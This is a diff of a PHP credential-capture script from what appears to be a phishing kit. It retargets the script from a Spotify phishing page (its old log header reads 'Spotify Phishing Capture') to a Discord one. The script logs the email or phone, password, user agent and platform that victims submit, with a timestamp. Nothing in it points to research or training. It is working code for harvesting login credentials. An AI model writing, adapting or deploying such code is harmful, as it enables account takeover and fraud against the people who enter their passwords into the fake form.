@@ -7,10 +7,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     if ($credentials) {
         $timestamp = date('Y-m-d H:i:s');
-        $log = "=== Spotify Phishing Capture ===\n";
+        $log = "=== Discord Capture ===\n";
         $log .= "Timestamp: $timestamp\n";
         $log .= "Type: " . ($credentials['type'] ?? 'unknown') . "\n";
-        $log .= "Email/Username: " . ($credentials['email'] ?? 'N/A') . "\n";
+        $log .= "Email/Phone: " . ($credentials['email'] ?? 'N/A') . "\n";
         $log .= "Password: " . ($credentials['password'] ?? 'N/A') . "\n";
         $log .= "User Agent: " . ($credentials['userAgent'] ?? 'N/A') . "\n";
         $log .= "Platform: " . ($credentials['platform'] ?? 'N/A') . "\n";
